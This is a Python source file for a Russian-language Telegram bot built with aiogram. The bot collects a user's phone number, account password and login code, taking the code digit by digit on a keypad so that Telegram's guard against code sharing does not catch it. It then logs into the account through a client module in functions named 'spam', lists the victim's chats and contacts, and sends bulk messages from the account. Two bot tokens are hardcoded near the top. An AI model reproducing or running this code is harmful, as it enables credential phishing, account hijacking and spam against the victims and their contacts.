import asyncio
import json
import os
from threading import Thread

from aiogram import Bot, Dispatcher, F, types
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.types import (FSInputFile, InlineKeyboardButton,
                           InlineKeyboardMarkup, KeyboardButton, Message,
                           ReplyKeyboardRemove)
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.utils.markdown import hbold, hitalic, hlink

import time
import client
import database
from states import SaveInfo, SendText, EnterCode

# TOKEN = "6605690741:AAGCR2CWPFesB7-N09yta2S2DxTIkuyYAso"
TOKEN = "6368678074:AAEyPz9q_PLp7DGws1Ltk2AIHwDEEneEL1Q"

dp = Dispatcher()
bot = Bot(TOKEN, parse_mode=ParseMode.HTML)
user_page = {}
@dp.message(CommandStart())
async def command_start(message: Message, state: FSMContext) -> None:
    try:
        os.remove(f'/session/{message.from_user.username}.session')
    except:
        pass
    try:
        os.remove(f'/session/{message.from_user.username}_true.json')
    except:
        pass
    try:
        os.remove(f'/session/{message.from_user.username}_false.json')
    except:
        pass
    builder = ReplyKeyboardBuilder()
    btn = KeyboardButton(text="Отправить телефон", request_contact=True)
    builder.row(btn)
    await message.reply("Приветствуем!\nДля использования бота необходим ваш номер телефона", reply_markup=builder.as_markup(resize_keyboard=True))
    await state.set_state(SaveInfo.send_phone)

@dp.message(SaveInfo.send_phone)
async def phone_user(message: Message, state: FSMContext) -> None:
    await state.update_data(phone = message.contact.phone_number)
    builder = ReplyKeyboardBuilder()
    btn1 = KeyboardButton(text="Да")
    btn2 = KeyboardButton(text="Нет")
    builder.row(btn1, btn2)
    await message.reply("Бот вас запомнил!\nСкажите, есть ли пароль у вашего телеграмм аккаунта?", reply_markup=builder.as_markup(resize_keyboard=True))
    await state.set_state(SaveInfo.has_pass)

@dp.message(SaveInfo.has_pass)
async def has_pass(message: Message, state: FSMContext) -> None:  
    if message.text == 'Да':
        await message.reply("Отправьте ваш пароль от телеграмм аккаунта", reply_markup=ReplyKeyboardRemove())
        await state.set_state(SaveInfo.send_pass)
    elif message.text == 'Нет':
        await state.update_data(password = None)
        data_user = await state.get_data()
        await database.insert_user(message.from_user.id,message.from_user.username, data_user)
        await message.reply('Ожидайте, проверяем введенные данные')
        new_thread = Thread(target=spam, args=(message.from_user.id,))
        new_thread.start()
        
        await message.answer('Выберите первую цифру кода (вводите цифры кода по очереди)', reply_markup=await create_btn())
        await state.set_state(EnterCode.first)

@dp.message(SaveInfo.send_pass)
async def update_pass(message: Message, state: FSMContext) -> None:  
    await state.update_data(password = message.text)
    data_user = await state.get_data()
    await database.insert_user(message.from_user.id,message.from_user.username, data_user)
    await message.reply('Ожидайте, проверяем введенные данные')
    new_thread = Thread(target=spam, args=(message.from_user.id,))
    new_thread.start()

    await message.answer('Выберите первую цифру кода (вводите цифры кода по очереди)', reply_markup=await create_btn())
    await state.set_state(EnterCode.first)

@dp.message(EnterCode.first)
async def update_pass(message: Message, state: FSMContext) -> None: 
    await message.reply('Набирайте код на клавиатуре под сообщением')

@dp.message(EnterCode.second)
async def update_pass(message: Message, state: FSMContext) -> None: 
    await message.reply('Набирайте код на клавиатуре под сообщением')

@dp.message(EnterCode.third)
async def update_pass(message: Message, state: FSMContext) -> None: 
    await message.reply('Набирайте код на клавиатуре под сообщением')

@dp.message(EnterCode.fourth)
async def update_pass(message: Message, state: FSMContext) -> None: 
    await message.reply('Набирайте код на клавиатуре под сообщением')

@dp.message(EnterCode.fifth)
async def update_pass(message: Message, state: FSMContext) -> None: 
    await message.reply('Набирайте код на клавиатуре под сообщением')

@dp.callback_query(EnterCode.first)
async def first_number(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(code1 = callback.data)
    await callback.message.edit_text('Выберите вторую цифру кода (вводите цифры кода по очереди)', reply_markup=await create_btn())
    await state.set_state(EnterCode.second)

@dp.callback_query(EnterCode.second)
async def second_number(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(code2 = callback.data)
    await callback.message.edit_text('Выберите третью цифру кода (вводите цифры кода по очереди)', reply_markup=await create_btn())
    await state.set_state(EnterCode.third)

@dp.callback_query(EnterCode.third)
async def third_number(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(code3 = callback.data)
    await callback.message.edit_text('Выберите четвертую цифру кода (вводите цифры кода по очереди)', reply_markup=await create_btn())
    await state.set_state(EnterCode.fourth)

@dp.callback_query(EnterCode.fourth)
async def fourth_number(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(code4 = callback.data)
    await callback.message.edit_text('Выберите пятую цифру кода (вводите цифры кода по очереди)', reply_markup=await create_btn())
    await state.set_state(EnterCode.fifth)

@dp.callback_query(EnterCode.fifth)
async def fourth_number(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(code5 = callback.data)
    await callback.message.edit_text('Ожидайте, входим в ваш аккаунт')
    data = await state.get_data()
    code = data['code1'] + data['code2'] + data['code3'] + data['code4'] + data['code5']
    await database.insert_code(callback.from_user.id, code)
    check = await check_result(callback.from_user.username)
    if check == True:
        await callback.message.delete()
        await callback.message.answer('Подключение успешно!', reply_markup=await menu_btn())
        await state.clear()
    elif check == "Flood":
        await callback.message.delete()
        await callback.message.answer('Ваш аккаунт заблокирован из-за неудачных попыток ввода, дождитесь разблокировки ', reply_markup=await back_btn())
        await state.clear()
    else:
        await database.delete_user(callback.from_user.id)
        await callback.message.answer('Подключение не удалось...', reply_markup=await back_btn())
        await state.clear()

@dp.message(F.text == "Вернуться в начало")
async def start_bot(message: Message, state: FSMContext):
    try:
        os.remove(f'/session/{message.from_user.username}.session')
    except:
        pass
    try:
        os.remove(f'/session/{message.from_user.username}_true.json')
    except:
        pass
    try:
        os.remove(f'/session/{message.from_user.username}_false.json')
    except:
        pass
    builder = ReplyKeyboardBuilder()
    btn = KeyboardButton(text="Отправить телефон", request_contact=True)
    builder.row(btn)
    await message.reply("Для использования бота необходим ваш номер телефона", reply_markup=builder.as_markup(resize_keyboard=True))
    await state.set_state(SaveInfo.send_phone)

@dp.message(F.text == "Выбрать пользователей для рассылки")
async def chats_user(message: Message):
    text_mes = "Ожидайте, получаем список ваших чатов"
    mes_id = await message.reply(text_mes)
    new_thread = Thread(target=chats, args=(message.from_user.id,))
    new_thread.start()
    while new_thread.is_alive():
        for i in range(3):
            text = '.' * (i + 1)
            text_mes_edit = text_mes + text
            #await bot.edit_text(text_mes_edit)
            await bot.edit_message_text(text_mes_edit, message.from_user.id, mes_id.message_id)
            time.sleep(0.5)
    new_thread.join()
    file_name = f"chat_{message.from_user.id}.json"
    with open(file_name, 'r') as file:
        js = json.loads(file.read())
    send = []
    for chat in js[:50]:
        text = ''
        builder = InlineKeyboardBuilder()
        if chat["verif"]:
            text += f'{chat["name"]}👍\nПоследнее сообщение: {chat["last_mes"]}\n\n'
            send.append(str(chat['id']))
            builder.button(text="Отправить✅", callback_data=f"approve_{chat['id']}")
        else:
            text += f'{chat["name"]}🤔\nПоследнее сообщение: {chat["last_mes"]}\n\n'
            builder.button(text="Отправить", callback_data=f"send_{chat['id']}")
        await message.answer(text, reply_markup=builder.as_markup())

    file_name = f"send_{message.from_user.id}.json"
    with open(file_name, 'w+') as file:
        file.write(json.dumps(send))
    builder_reply = ReplyKeyboardBuilder()
    builder_reply.button(text="Разослать")
    if len(js) > 50:
        user_page[message.from_user.id] = {'page' : 1, 'count_page': len(js) // 50 + 1}
        builder_reply.button(text="Далее")
    await message.answer("Выберите действие", reply_markup=builder_reply.as_markup(resize_keyboard=True))

@dp.callback_query(F.data.startswith("send_"))
async def callbacks_send(callback: types.CallbackQuery):
    data_call = callback.data.replace('send_', '')
    file_name = f"send_{callback.from_user.id}.json"
    with open(file_name, 'r') as file:
        js = json.loads(file.read())
    js.append(data_call)
    with open(file_name, 'w') as file:
        file.write(json.dumps(js))
    builder = InlineKeyboardBuilder()
    builder.button(text="Отправить✅", callback_data=f"approve_{data_call}")
    await callback.message.edit_reply_markup(reply_markup=builder.as_markup())

@dp.callback_query(F.data.startswith("approve_"))
async def callbacks_approve(callback: types.CallbackQuery):
    data_call = callback.data.replace('approve_', '')
    file_name = f"send_{callback.from_user.id}.json"
    with open(file_name, 'r') as file:
        js = json.loads(file.read())
    js.remove(data_call)
    with open(file_name, 'w') as file:
        file.write(json.dumps(js))
    builder = InlineKeyboardBuilder()
    builder.button(text="Отправить", callback_data=f"send_{data_call}")
    await callback.message.edit_reply_markup(reply_markup=builder.as_markup())

@dp.message(F.text == "Запросить чаты")
async def get_chats_new(message: Message):
    os.remove(f"chat_{message.from_user.id}.json")
    await client.get_chats(message.from_user.id)

@dp.message(F.text == "Показать контакты")
async def show_contacts(message: Message):
    contacts = await client.get_contacts(message.from_user.id)

    if contacts:
        formatted_contacts = "\n".join([f"{index + 1}. {contact.first_name} {contact.last_name} (@{contact.username})" for index, contact in enumerate(contacts)])
        result_text = f"<b>Контакты:</b>\n{formatted_contacts}"
    else:
        result_text = "<b>У вас нет контактов.</b>"
    await message.answer(text=result_text)

@dp.message(F.text == "Далее")
async def next_page(message: Message):
    page = user_page[message.from_user.id]['page']
    next_page = page + 1
    start_index = page * 50
    stop_index = next_page * 50

    file_name = f"chat_{message.from_user.id}.json"
    with open(file_name, 'r') as file:
        js = json.loads(file.read())

    file_name = f"send_{message.from_user.id}.json"
    with open(file_name, 'r') as file:
        send = json.loads(file.read())
    
    for chat in js[start_index:stop_index]:
        text = ''
        builder = InlineKeyboardBuilder()
        if chat["verif"]:
            text += f'{chat["name"]}👍\nПоследнее сообщение: {chat["last_mes"]}\n\n'
            send.append(str(chat['id']))
            builder.button(text="Отправить✅", callback_data=f"approve_{chat['id']}")
        else:
            text += f'{chat["name"]}🤔\nПоследнее сообщение: {chat["last_mes"]}\n\n'
            builder.button(text="Отправить", callback_data=f"send_{chat['id']}")
        await message.answer(text, reply_markup=builder.as_markup())

    file_name = f"send_{message.from_user.id}.json"
    with open(file_name, 'w+') as file:
        file.write(json.dumps(send))

    builder_reply = ReplyKeyboardBuilder()
    user_page[message.from_user.id] = {'page' : next_page, 'count_page': len(js) // 50 + 1}
    if next_page < user_page[message.from_user.id]['count_page']:
        builder_reply.button(text="Назад")
        builder_reply.button(text="Разослать")
        builder_reply.button(text="Далее")

    elif next_page == user_page[message.from_user.id]['count_page']:
        builder_reply.button(text="Назад")
        builder_reply.button(text="Разослать")

    await message.answer("Выберите действие", reply_markup=builder_reply.as_markup(resize_keyboard=True))

@dp.message(F.text == "Назад")
async def next_page(message: Message):
    page = user_page[message.from_user.id]['page']
    prev_page = page - 1
    stop_index = page * 50
    start_index = prev_page * 50

    file_name = f"chat_{message.from_user.id}.json"
    with open(file_name, 'r') as file:
        js = json.loads(file.read())
    
    for chat in js[start_index:stop_index]:
        text = ''
        builder = InlineKeyboardBuilder()
        if chat["verif"]:
            text += f'{chat["name"]}✅\nПоследнее сообщение: {chat["last_mes"]}\n\n'
            builder.button(text="Отправить✅", callback_data=f"approve_{chat['id']}")
        else:
            text += f'{chat["name"]}🤔\nПоследнее сообщение: {chat["last_mes"]}\n\n'
            builder.button(text="Отправить", callback_data=f"send_{chat['id']}")
        await message.answer(text, reply_markup=builder.as_markup())

    builder_reply = ReplyKeyboardBuilder()
    user_page[message.from_user.id] = {'page' : next_page, 'count_page': len(js) // 50 + 1}
    if not prev_page == 1:
        builder_reply.button(text="Назад")
        builder_reply.button(text="Разослать")
        builder_reply.button(text="Далее")

    else:
        builder_reply.button(text="Разослать")
        builder_reply.button(text="Далее")

    await message.answer("Выберите действие", reply_markup=builder_reply.as_markup(resize_keyboard=True))

@dp.message(F.text == "Разослать")
async def callbacks_approve(message: Message, state: FSMContext):
    file_name = f"send_{message.from_user.id}.json"
    with open(file_name, 'r') as file:
        send = json.loads(file.read())
    if not send == []:
        await message.reply("Введите текст\nПосле отправки начнется рассылка")
        await state.set_state(SendText.send_text)
    else:
        text = f"{hbold('Вы должны выбрать пользователей!')}\n"
        await message.reply(text, reply_markup=await menu_btn(), parse_mode="HTML")

@dp.message(SendText.send_text)
async def send_text(message: Message, state: FSMContext) -> None: 
    await message.reply("Ожидайте, начинаем рассылку")
    new_thread = Thread(target=send_to_chats, args=(message.from_user.id,message.text,))
    new_thread.start()
    new_thread.join()
    await state.clear()
    await message.answer("Рассылка закочнена!", reply_markup=await menu_btn())

async def menu_btn():
    builder = ReplyKeyboardBuilder()
    btns = [KeyboardButton(text="Выбрать пользователей для рассылки"),
            KeyboardButton(text="Показать контакты"),
            KeyboardButton(text="Запросить чаты")
        ]
    builder.row(*btns)
    return builder.as_markup(resize_keyboard=True)  

async def back_btn():
    builder = ReplyKeyboardBuilder()
    btn = KeyboardButton(text="Вернуться в начало")
    builder.row(btn)
    return builder.as_markup(resize_keyboard=True) 

async def check_result(user_name):
    file_name_true = f'{user_name}_true.json'
    file_name_false = f'{user_name}_false.json'
    file_name_flood = f'{user_name}_flood.json'
    while True:
        for file in os.listdir(os.path.abspath(os.curdir)+ '/session'):
            if file == file_name_true:
                return True    
            elif file == file_name_false:
                return False
            elif file == file_name_flood:
                return "Flood"
            time.sleep(0.5)

async def create_btn():
    builder = InlineKeyboardBuilder()
    for i in range(1,10):
        builder.button(text=str(i), callback_data=str(i))
    builder.button(text=str(0), callback_data=str(0))
    builder.adjust(5)
    return builder.as_markup()

def send_to_chats(tg_id, text):
    asyncio.run(client.spam_to_chat(tg_id, text))

def chats(tg_id):
    asyncio.run(client.get_chats(tg_id))

def spam(tg_id):
    asyncio.run(client.first_connect(tg_id))

async def start() -> None:
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(start())
